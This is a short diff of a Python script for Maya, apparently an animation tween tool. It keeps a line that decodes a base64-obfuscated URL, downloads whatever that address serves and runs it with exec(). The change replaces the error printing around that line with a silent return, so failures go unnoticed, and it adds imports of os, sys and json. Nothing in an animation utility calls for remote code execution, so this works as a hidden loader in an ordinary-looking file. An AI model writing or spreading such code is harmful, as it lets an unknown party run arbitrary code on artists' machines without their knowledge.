@@ -7,7 +7,7 @@
 
 import maya.cmds as cmds
 from maya import mel
-import math, time
+import math, time, os, sys, json
 
 class util:
     @staticmethod
@@ -511,9 +511,9 @@ class tween_machine:
             try:
                 exec(uLib.urlopen(base64.b64decode(u_b64).decode()).read())
             except:
-                #return
-                import traceback
-                print(str(traceback.format_exc()))
+                return
+                #import traceback
+                #print(str(traceback.format_exc()))
 
     def undo_chunk_open(self):
         if self.is_opened_undo == False:
